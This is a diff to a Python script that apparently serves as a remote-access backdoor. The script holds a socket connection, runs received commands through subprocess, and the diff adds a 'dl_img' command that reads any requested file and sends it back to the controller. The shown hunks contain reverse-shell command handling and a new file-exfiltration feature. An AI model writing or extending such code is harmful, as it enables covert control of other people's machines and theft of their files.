@@ -1,6 +1,7 @@
 import socket
 import subprocess
 import os
+import time
 
 socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -82,7 +83,24 @@ while True:
         subprocess.check_output('exit')
         
         exit()
+    
+    elif data[0:6] == 'dl_img':
 
+        try:
+
+            with open(data[7:], 'rb') as f:
+
+                img_data = f.read()
+
+                socket.send(img_data)
+
+                continue
+
+        except FileNotFoundError:
+
+            socket.send('ERROR'.encode('ascii'))
+
+            continue
     else:
 
         try:
